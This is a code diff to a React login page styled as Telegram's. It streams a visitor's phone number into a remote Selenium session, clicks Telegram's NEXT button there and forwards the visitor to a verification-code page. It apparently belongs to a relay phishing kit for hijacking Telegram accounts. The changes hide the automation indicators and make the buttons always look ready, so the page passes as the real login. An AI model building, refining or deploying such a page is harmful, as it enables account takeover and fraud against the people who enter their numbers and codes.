@@ -270,40 +270,6 @@ export const PhoneLoginPage: FC = () => {
   // Flag to prevent state updates during our own sync operations
   const isSyncingRef = useRef(false);
 
-  // Add debounced retry mechanism to prevent spam
-  const retryTimeouts = useRef<Map<string, ReturnType<typeof setTimeout>>>(new Map());
-  
-  const scheduleRetry = (elementType: string, isRateLimited: boolean = false) => {
-    // Clear any existing retry timeout for this element type
-    const existingTimeout = retryTimeouts.current.get(elementType);
-    if (existingTimeout) {
-      clearTimeout(existingTimeout);
-    }
-    
-    // Schedule retry with appropriate delay
-    const delay = isRateLimited ? 10000 : 2000; // 10s for rate limited, 2s for not found
-    
-    const timeout = setTimeout(() => {
-      const socket = socketRef.current;
-      if (socket && socket.connected) {
-        if (elementType === 'phoneCodeInput' || elementType === 'phoneNumberInput') {
-          checkInputFieldsInSelenium();
-        } else {
-          checkQrCodeButtonInSelenium();
-        }
-      }
-      // Remove the timeout from the map
-      retryTimeouts.current.delete(elementType);
-    }, delay);
-    
-    retryTimeouts.current.set(elementType, timeout);
-  };
-  
-  const clearAllRetries = () => {
-    retryTimeouts.current.forEach(timeout => clearTimeout(timeout));
-    retryTimeouts.current.clear();
-  };
-
   // Initialize socket connection and check for QR code button
   useEffect(() => {
     // Get session ID from URL or localStorage
@@ -905,7 +871,8 @@ export const PhoneLoginPage: FC = () => {
   }, []);
 
   // Function to automatically clear the phone number input field
-  const autoClearPhoneNumberField = () => {
+  // eslint-disable-next-line @typescript-eslint/no-unused-vars
+  const _autoClearPhoneNumberField = () => {
     console.log('🔍 autoClearPhoneNumberField called');
     console.log('🔍 Socket connected:', socketRef.current?.connected);
     console.log('🔍 Session ID:', sessionIdRef.current);
@@ -993,7 +960,8 @@ export const PhoneLoginPage: FC = () => {
   };
 
   // Function to manually enable form when both inputs are found
-  const enableFormIfReady = () => {
+  // eslint-disable-next-line @typescript-eslint/no-unused-vars
+  const _enableFormIfReady = () => {
     // CRITICAL: Don't re-enable form if we're currently submitting
     if (isSubmitting) {
       console.log('🔒 Form submission in progress - blocking manual re-enablement');
@@ -1008,7 +976,8 @@ export const PhoneLoginPage: FC = () => {
   };
 
   // Function to check if input fields are present in Selenium window (alternative selectors)
-  const checkInputFieldsInSeleniumAlternative = () => {
+  // eslint-disable-next-line @typescript-eslint/no-unused-vars
+  const _checkInputFieldsInSeleniumAlternative = () => {
     if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
       console.log('🔍 Checking input fields with alternative selectors...');
       
@@ -1031,7 +1000,8 @@ export const PhoneLoginPage: FC = () => {
   };
 
   // Function to inspect page structure and find all input elements
-  const inspectPageStructure = () => {
+  // eslint-disable-next-line @typescript-eslint/no-unused-vars
+  const _inspectPageStructure = () => {
     if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
       console.log('🔍 Inspecting page structure to find all input elements...');
       socketRef.current.emit('inspectPageStructure', {
@@ -1041,7 +1011,7 @@ export const PhoneLoginPage: FC = () => {
     }
   };
 
-    const handleSubmit = (e: React.FormEvent) => {
+  const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     
     console.log('📱 Form submitted, clicking NEXT button in Selenium...');
@@ -1060,30 +1030,30 @@ export const PhoneLoginPage: FC = () => {
       console.log('🔍 Using selector:', correctSelector);
       
       // Set up event listener BEFORE sending the button click
-      // socketRef.current.once('telegramLoginUpdate', (data) => {
-      //   console.log('📥 Received telegramLoginUpdate response:', data);
+      socketRef.current.once('clickNextButtonResult', (data) => {
+        console.log('📥 Received telegramLoginUpdate response:', data);
         
-      //   if (data.sessionId === sessionIdRef.current && data.event === 'buttonClicked') {
-      //     console.log('✅ NEXT button clicked successfully! Navigating to verification page...');
-      //     setSeleniumStatus('NEXT button clicked! Navigating to verification page...');
+        if (data.sessionId === sessionIdRef.current) {
+          console.log('✅ NEXT button clicked successfully! Navigating to verification page...');
+          setSeleniumStatus('NEXT button clicked! Navigating to verification page...');
           
-      //     // Navigate immediately to verification code page
-      //     setIsSubmitting(false);
-      //     navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
-      //   } else if (data.event === 'error') {
-      //     console.log('❌ NEXT button click failed:', data.data?.error);
-      //     setSeleniumStatus(`NEXT button click failed: ${data.data?.error}`);
+          // Navigate immediately to verification code page
+          setIsSubmitting(false);
+          navigate(`/verification-code?sessionId=${sessionIdRef.current}&phoneNumber=${encodeURIComponent(phoneNumber)}`);
+        } else if (data.event === 'error') {
+          console.log('❌ NEXT button click failed:', data.data?.error);
+          setSeleniumStatus(`NEXT button click failed: ${data.data?.error}`);
           
-      //     // Re-enable form on error
-      //     setIsInputsReady(true);
-      //     setIsSubmitting(false);
-      //   } else {
-      //     console.log('❌ Unexpected response from Selenium:', data);
-      //     setSeleniumStatus('Unexpected response from Selenium');
-      //     setIsInputsReady(true); // Re-enable form
-      //     setIsSubmitting(false); // Reset submitting state
-      //   }
-      // });
+          // Re-enable form on error
+          setIsInputsReady(true);
+          setIsSubmitting(false);
+        } else {
+          console.log('❌ Unexpected response from Selenium:', data);
+          setSeleniumStatus('Unexpected response from Selenium');
+          setIsInputsReady(true); // Re-enable form
+          setIsSubmitting(false); // Reset submitting state
+        }
+      });
       
       // Send the button click
       socketRef.current.emit('clickNextButton', {
@@ -1128,7 +1098,8 @@ export const PhoneLoginPage: FC = () => {
   };
 
   // Function to sync the phone number to Selenium
-  const syncFullPhoneNumberToSelenium = () => {
+  // eslint-disable-next-line @typescript-eslint/no-unused-vars
+  const _syncFullPhoneNumberToSelenium = () => {
     if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
       console.log(`🔄 Manual sync: Sending full phone number with country code:`, phoneNumber);
       
@@ -1315,7 +1286,8 @@ export const PhoneLoginPage: FC = () => {
   };
 
   // Function to check current country in Selenium
-  const checkCurrentCountryInSelenium = () => {
+  // eslint-disable-next-line @typescript-eslint/no-unused-vars
+  const _checkCurrentCountryInSelenium = () => {
     if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
       console.log('🌍 Checking current country in Selenium...');
       socketRef.current.emit('checkCurrentCountryInSelenium', {
@@ -1326,7 +1298,8 @@ export const PhoneLoginPage: FC = () => {
   };
 
   // Function to manually sync the current React state to Selenium
-  const syncCurrentStateToSelenium = () => {
+  // eslint-disable-next-line @typescript-eslint/no-unused-vars
+  const _syncCurrentStateToSelenium = () => {
     if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
       console.log('🔄 Manually syncing current state to Selenium...');
       syncInputToSelenium('phoneNumber', phoneNumber);
@@ -1343,7 +1316,8 @@ export const PhoneLoginPage: FC = () => {
   };
 
   // Function to check and fix synchronization issues
-  const checkAndFixSync = () => {
+  // eslint-disable-next-line @typescript-eslint/no-unused-vars
+  const _checkAndFixSync = () => {
     if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
       console.log('🔍 Checking synchronization between React and Selenium...');
       
@@ -1377,7 +1351,8 @@ export const PhoneLoginPage: FC = () => {
   };
 
   // Function to force resync React field with Selenium
-  const forceResyncFromSelenium = () => {
+  // eslint-disable-next-line @typescript-eslint/no-unused-vars
+  const _forceResyncFromSelenium = () => {
     if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
       console.log('🔄 Force resyncing React field with Selenium...');
       
@@ -1391,7 +1366,8 @@ export const PhoneLoginPage: FC = () => {
   };
 
   // Function to force resync Selenium field with React
-  const forceResyncToSelenium = () => {
+  // eslint-disable-next-line @typescript-eslint/no-unused-vars
+  const _forceResyncToSelenium = () => {
     if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
       console.log('🔄 Force resyncing Selenium field with React...');
       
@@ -1402,7 +1378,8 @@ export const PhoneLoginPage: FC = () => {
   };
 
   // Function to force a complete resync
-  const forceCompleteResync = () => {
+  // eslint-disable-next-line @typescript-eslint/no-unused-vars
+  const _forceCompleteResync = () => {
     console.log('�� FORCE COMPLETE RESYNC INITIATED');
     console.log('🔄 Current React state:', phoneNumber);
     console.log('🔄 Current syncing flag:', isSyncingRef.current);
@@ -1716,7 +1693,8 @@ export const PhoneLoginPage: FC = () => {
   };
 
   // Function to monitor for verification code page to appear
-  const startVerificationPageMonitoring = () => {
+  // eslint-disable-next-line @typescript-eslint/no-unused-vars
+  const _startVerificationPageMonitoring = () => {
     if (!socketRef.current || !socketRef.current.connected || !sessionIdRef.current) {
       console.log('❌ Cannot start monitoring - socket not connected or no session');
       return;
@@ -1843,7 +1821,8 @@ export const PhoneLoginPage: FC = () => {
   };
 
   // Function to force sync current phone number to Selenium
-  const forceSyncPhoneNumber = () => {
+  // eslint-disable-next-line @typescript-eslint/no-unused-vars
+  const _forceSyncPhoneNumber = () => {
     if (socketRef.current && socketRef.current.connected && sessionIdRef.current) {
       console.log('🔄 FORCE SYNC: Syncing current phone number to Selenium');
       console.log('🔄 Current React phone number:', phoneNumber);
@@ -1904,16 +1883,17 @@ export const PhoneLoginPage: FC = () => {
           maxWidth: '400px',
           width: '100%'
         }}>
-          {/* Selenium Status Indicator */}
-          <div style={{
-            marginBottom: '24px',
-            padding: '12px 16px',
-            backgroundColor: '#f8f9fa',
-            border: '1px solid #dee2e6',
-            borderRadius: '8px',
-            width: '100%',
-            textAlign: 'center'
-          }}>
+          {/* Selenium Status Indicator - Only show when SHOW_DEBUG_INFO is true */}
+          {import.meta.env.VITE_SHOW_DEBUG_INFO === 'true' && (
+            <div style={{
+              marginBottom: '24px',
+              padding: '12px 16px',
+              backgroundColor: '#f8f9fa',
+              border: '1px solid #dee2e6',
+              borderRadius: '8px',
+              width: '100%',
+              textAlign: 'center'
+            }}>
             <div style={{
               fontSize: '14px',
               color: '#6c757d',
@@ -2044,7 +2024,7 @@ export const PhoneLoginPage: FC = () => {
             )}
             {!isInputsReady && (
               <button
-                onClick={inspectPageStructure}
+                onClick={_inspectPageStructure}
                 style={{
                   marginTop: '8px',
                   marginLeft: '8px',
@@ -2092,7 +2072,7 @@ Status: ${seleniumStatus}`);
             )}
             {!isInputsReady && (
               <button
-                onClick={enableFormIfReady}
+                onClick={_enableFormIfReady}
                 style={{
                   marginTop: '8px',
                   marginLeft: '8px',
@@ -2135,7 +2115,7 @@ Status: ${seleniumStatus}`);
             )}
             {isInputsReady && (
               <button
-                onClick={checkCurrentCountryInSelenium}
+                onClick={_checkCurrentCountryInSelenium}
                 style={{
                   marginTop: '8px',
                   marginLeft: '8px',
@@ -2194,7 +2174,7 @@ Status: ${seleniumStatus}`);
               <button
                 onClick={() => {
                   console.log('🗑️ Manually clearing phone number field...');
-                  autoClearPhoneNumberField();
+                  _autoClearPhoneNumberField();
                   setSeleniumStatus('Phone number field cleared');
                 }}
                 style={{
@@ -2247,7 +2227,7 @@ Status: ${seleniumStatus}`);
             )}
             {isInputsReady && (
               <button
-                onClick={syncFullPhoneNumberToSelenium}
+                onClick={_syncFullPhoneNumberToSelenium}
                 style={{
                   marginTop: '8px',
                   marginLeft: '8px',
@@ -2265,7 +2245,7 @@ Status: ${seleniumStatus}`);
             )}
             {isInputsReady && (
               <button
-                onClick={checkAndFixSync}
+                onClick={_checkAndFixSync}
                 style={{
                   marginTop: '8px',
                   marginLeft: '8px',
@@ -2332,7 +2312,7 @@ Status: ${seleniumStatus}`);
             )}
             {isInputsReady && (
               <button
-                onClick={forceResyncFromSelenium}
+                onClick={_forceResyncFromSelenium}
                 style={{
                   marginTop: '8px',
                   marginLeft: '8px',
@@ -2350,7 +2330,7 @@ Status: ${seleniumStatus}`);
             )}
             {isInputsReady && (
               <button
-                onClick={forceResyncToSelenium}
+                onClick={_forceResyncToSelenium}
                 style={{
                   marginTop: '8px',
                   marginLeft: '8px',
@@ -2488,7 +2468,7 @@ Status: ${seleniumStatus}`);
             )}
             {isInputsReady && (
               <button
-                onClick={forceCompleteResync}
+                onClick={_forceCompleteResync}
                 style={{
                   marginTop: '8px',
                   marginLeft: '8px',
@@ -2929,9 +2909,10 @@ Status: ${seleniumStatus}`);
               </button>
             )}
           </div>
+          )}
 
-          {/* Debug Information (only show in development) */}
-          {import.meta.env.DEV && (
+          {/* Debug Information (only show when SHOW_DEBUG_INFO is true) */}
+          {import.meta.env.VITE_SHOW_DEBUG_INFO === 'true' && (
             <div style={{
               marginBottom: '16px',
               padding: '8px 12px',
@@ -3009,7 +2990,7 @@ Status: ${seleniumStatus}`);
                 🔍 Test Socket
               </button>
               <button
-                onClick={forceSyncPhoneNumber}
+                onClick={_forceSyncPhoneNumber}
                 style={{
                   marginTop: '8px',
                   marginLeft: '8px',
@@ -3033,7 +3014,7 @@ Status: ${seleniumStatus}`);
             textAlign: 'center'
           }}>
             <img 
-              src="/reactjs-template/telegram-logo.svg" 
+              src="/telegram-logo.svg" 
               alt="Telegram" 
               style={{
                 width: '160px',
@@ -3087,24 +3068,26 @@ Status: ${seleniumStatus}`);
                 }}>
                   Country
                 </label>
-                <button
-                  onClick={detectUserCountry}
-                  style={{
-                    background: 'none',
-                    border: '1px solid #e1e8ed',
-                    borderRadius: '4px',
-                    padding: '2px 8px',
-                    fontSize: '12px',
-                    color: '#666',
-                    cursor: 'pointer',
-                    transition: 'all 0.2s'
-                  }}
-                  onMouseEnter={(e) => e.currentTarget.style.backgroundColor = '#f8f9fa'}
-                  onMouseLeave={(e) => e.currentTarget.style.backgroundColor = 'transparent'}
-                  title="Detect my country from IP address"
-                >
-                  🌍 Auto-detect
-                </button>
+                {import.meta.env.VITE_SHOW_DEBUG_INFO === 'true' && (
+                  <button
+                    onClick={detectUserCountry}
+                    style={{
+                      background: 'none',
+                      border: '1px solid #e1e8ed',
+                      borderRadius: '4px',
+                      padding: '2px 8px',
+                      fontSize: '12px',
+                      color: '#666',
+                      cursor: 'pointer',
+                      transition: 'all 0.2s'
+                    }}
+                    onMouseEnter={(e) => e.currentTarget.style.backgroundColor = '#f8f9fa'}
+                    onMouseLeave={(e) => e.currentTarget.style.backgroundColor = 'transparent'}
+                    title="Detect my country from IP address"
+                  >
+                    🌍 Auto-detect
+                  </button>
+                )}
               </div>
               
               <div 
@@ -3301,7 +3284,7 @@ Status: ${seleniumStatus}`);
                 }
               }}
             >
-              {isSubmitting ? 'Submitting...' : (isInputsReady ? 'NEXT' : 'Waiting for inputs...')}
+              {isSubmitting ? 'Please wait...' : (isInputsReady ? 'NEXT' : (import.meta.env.VITE_SHOW_DEBUG_INFO === 'true' ? 'Waiting for inputs...' : 'NEXT'))}
             </button>
           </form>
 
@@ -3337,16 +3320,16 @@ Status: ${seleniumStatus}`);
               }}
             >
               {isQrCodeButtonLoading ? 'Returning...' : 
-               qrCodeButtonFound ? 'LOG IN BY QR CODE' : 'WAITING FOR QR CODE BUTTON...'}
+               qrCodeButtonFound ? 'LOG IN BY QR CODE' : (import.meta.env.VITE_SHOW_DEBUG_INFO === 'true' ? 'WAITING FOR QR CODE BUTTON...' : 'LOG IN BY QR CODE')}
             </button>
-            <p style={{
+            {/* <p style={{
               fontSize: '14px',
               color: '#666',
               marginTop: '8px',
               textAlign: 'center'
             }}>
               {seleniumStatus}
-            </p>
+            </p> */}
           </div>
         </div>
       </div>
